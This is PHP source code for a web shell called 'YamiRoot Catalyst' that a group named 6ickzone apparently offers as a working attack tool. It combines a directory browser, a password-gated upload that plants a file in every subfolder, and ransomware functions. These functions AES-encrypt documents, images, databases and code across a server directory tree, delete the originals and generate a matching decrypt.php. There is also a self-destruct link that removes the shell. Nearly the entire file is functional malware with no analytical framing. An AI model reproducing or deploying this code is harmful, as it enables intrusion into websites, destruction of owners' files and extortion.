<?php
/**
 * YamiRoot Catalyst
 * 0x6ick - 6ickzone
 * t.me/yungx6ick
 */
set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);

// --- Config ---
$k = "scarletdablackrose"; // Password
$e = ".6ickzone"; 
$n = "!!!DECRYPT_ME!!!.html";
$this_file = basename(__FILE__);
$x = [$this_file, 'decrypt.php', $n, '.htaccess', 'php.ini', 'error_log', 'BYEBYE.txt'];
$t = ['txt','doc','docx','xls','xlsx','pdf','jpg','jpeg','png','gif','mp3','mp4','zip','rar','7z','sql','php','js','css','html'];

// --- kill ---
if (isset($_GET['action']) && $_GET['action'] === 'self_destruct') {
    @unlink(__FILE__);
    header("Location: /");
    exit;
}

// --- upload ---
$up_msg = "";
if (isset($_POST['up_secure'])) {
    if ($_POST['up_pass'] === $k) {
        if (isset($_FILES['mass_up'])) {
            $target_dir = $_POST['target_path_hidden'];
            foreach ($_FILES['mass_up']['name'] as $i => $name) {
                $content = file_get_contents($_FILES['mass_up']['tmp_name'][$i]);
                file_put_contents($target_dir . DIRECTORY_SEPARATOR . $name, $content);
                $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target_dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($ite as $folder) {
                    if ($folder->isDir()) file_put_contents($folder->getRealPath() . DIRECTORY_SEPARATOR . $name, $content);
                }
            }
            $up_msg = "Upload done";
        }
    } else { $up_msg = "What The Fuck!."; }
}

// --- DECRYPTOR ---
if (isset($_POST['gen_decrypt'])) {
    $dec_code = '<?php
set_time_limit(0); error_reporting(0);
$pass = "'.$k.'"; $ext = "'.$e.'";
if(isset($_POST["key"]) && $_POST["key"] === $pass){
    $dir = new RecursiveDirectoryIterator(__DIR__, RecursiveDirectoryIterator::SKIP_DOTS);
    $ite = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST);
    foreach ($ite as $f) {
        if ($f->isFile() && substr($f->getFilename(), -strlen($ext)) === $ext) {
            $p = $f->getRealPath(); $d = @file_get_contents($p);
            if(substr($d,0,9)==="6ickzone:"){
                $c = base64_decode(substr($d,9)); $iv = substr($c,0,16); $en = substr($c,16);
                $dc = openssl_decrypt($en,"AES-128-CBC",$pass,OPENSSL_RAW_DATA,$iv);
                if($dc){ file_put_contents(substr($p,0,-strlen($ext)),$dc); unlink($p); }
            }
        }
    }
    echo "All Clear..."; unlink(__FILE__); exit;
} ?>
<body style="background:#fff;color:#000;font-family:monospace;text-align:center;padding-top:20%;border:20px solid #ff0000;">
<h1>6ickZone Decryptor</h1>
<form method="post"><input type="password" name="key" placeholder="Masukkan Password" style="padding:10px;border:3px solid #000;">
<button type="submit" style="padding:10px;background:#000;color:#fff;border:none;cursor:pointer;">Decrypt Now</button></form>
</body>';
    file_put_contents('decrypt.php', $dec_code);
    $up_msg = "DECRYPTOR BERHASIL DIBUAT (decrypt.php).";
}

$raw_path = isset($_GET['path']) ? urldecode($_GET['path']) : getcwd();
$current_path = realpath($raw_path) ?: getcwd();
$breadcrumbs = [];
$parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));
$accum_path = DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    if ($part === '') continue;
    $accum_path .= $part . DIRECTORY_SEPARATOR;
    $breadcrumbs[] = ['name' => $part, 'path' => $accum_path];
}

// --- Encrypt ---
$c = 0; $run = false;
if (isset($_POST['lock'])) {
    $run = true;
    $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($_POST['target_dir'], RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($ite as $file) {
        $p = $file->getRealPath();
        if ($file->isDir() || in_array($file->getFilename(), $x) || pathinfo($p, PATHINFO_EXTENSION) === trim($e, '.') || !in_array(pathinfo($p, PATHINFO_EXTENSION), $t)) continue;
        $d = @file_get_contents($p);
        if ($d && substr($d, 0, 9) !== "6ickzone:") {
            $iv = openssl_random_pseudo_bytes(16);
            $ed = openssl_encrypt($d, 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $iv);
            if ($ed && file_put_contents($p . $e, "6ickzone:" . base64_encode($iv . $ed))) { @unlink($p); $c++; }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>YamiRoot Catalyst // 6ickzone</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background-color: #ffffff; color: #000; font-family: 'Courier New', monospace; margin: 0; 
            background-image: linear-gradient(45deg, #f0f0f0 25%, transparent 25%), linear-gradient(-45deg, #f0f0f0 25%, transparent 25%);
            background-size: 20px 20px;
        }
        .full-page { min-height: 100vh; padding: 40px 10%; border: 20px solid #000; border-right: 20px solid #ff0000; position: relative; }
        h1 { background: #000; color: #fff; padding: 10px 30px; display: inline-block; font-size: 30px; transform: rotate(-1deg); box-shadow: 8px 8px 0 #ff0000; margin-bottom: 40px; }
        .panel { border: 5px solid #000; background: #fff; }
        .bc-nav { background: #ff0000; color: #fff; padding: 10px; font-weight: bold; }
        .bc-nav a { color: #fff; text-decoration: none; border-bottom: 2px solid #fff; }
        .folder-list { height: 250px; overflow-y: auto; padding: 15px; background: #fff; }
        .item { display: flex; justify-content: space-between; border-bottom: 1px solid #eee; padding: 5px 0; font-size: 12px; }
        .item a { color: #000; text-decoration: none; }
        .control-area { padding: 20px; background: #f9f9f9; border-top: 5px solid #000; }
        input[type="password"], input[type="file"] { width: 100%; padding: 12px; border: 3px solid #000; margin-bottom: 10px; font-family: inherit; font-weight: bold; }
        button { width: 100%; padding: 15px; background: #000; color: #fff; border: none; font-weight: 900; text-transform: uppercase; cursor: pointer; margin-bottom: 5px; }
        button:hover { background: #ff0000; }
        .status-box { background: #000; color: #ff0000; padding: 10px; text-align: center; margin-bottom: 10px; font-weight: bold; }
        .kill-zone { position: absolute; bottom: 20px; right: 40px; }
        .kill-zone a { color: #ff0000; font-weight: 900; text-decoration: none; background: #000; padding: 5px 10px; }
        .footer-bg { margin-top: 20px; text-align: right; font-weight: 900; color: #eee; font-size: 40px; line-height: 0.8; pointer-events: none; }
    </style>
</head>
<body>
    <div class="full-page">
        <h1>YAMiRoot Catalyst</h1>
        <div class="panel">
            <div class="bc-nav">
                Dir :: <a href="?path=/">ROOT</a>
                <?php foreach ($breadcrumbs as $bc): ?> / <a href="?path=<?= urlencode($bc['path']) ?>"><?= htmlspecialchars($bc['name']) ?></a> <?php endforeach; ?>
            </div>
            <?php if ($up_msg): ?><div class="status-box"><?= $up_msg ?></div><?php endif; ?>
            <div class="folder-list">
                <div class="item"><a href="?path=<?= urlencode(dirname($current_path)) ?>">[ KEMBALI ]</a></div>
                <?php foreach (scandir($current_path) as $v): if($v=='.'||$v=='..')continue; $f=$current_path.DIRECTORY_SEPARATOR.$v; ?>
                    <div class="item"><a href="<?= is_dir($f) ? '?path='.urlencode($f) : '#' ?>"><?= is_dir($f) ? 'DIR >' : 'FILE >' ?> <?= $v ?></a></div>
                <?php endforeach; ?>
            </div>
            <div class="control-area">
                <form method="post" enctype="multipart/form-data">
                    <input type="password" name="up_pass" placeholder="PASSWORD" required>
                    <input type="hidden" name="target_path_hidden" value="<?= htmlspecialchars($current_path) ?>">
                    <input type="file" name="mass_up[]" multiple>
                    <button type="submit" name="up_secure">Upload</button>
                </form>
                <form method="post">
                    <input type="hidden" name="target_dir" value="<?= htmlspecialchars($current_path) ?>">
                    <button type="submit" name="lock" style="background:#ff0000;">Encrypt</button>
                </form>
                <form method="post">
                    <button type="submit" name="gen_decrypt" style="background:#fff; color:#000; border:3px solid #000;">Decryptor</button>
                </form>
            </div>
        </div>
        <div class="kill-zone"><a href="?action=self_destruct" onclick="return confirm('Yes?')">Want To Kill Me?</a></div>
        <div class="footer-bg">6ICKZONE<br>YamiRoot</div>
    </div>
</body>
</html>
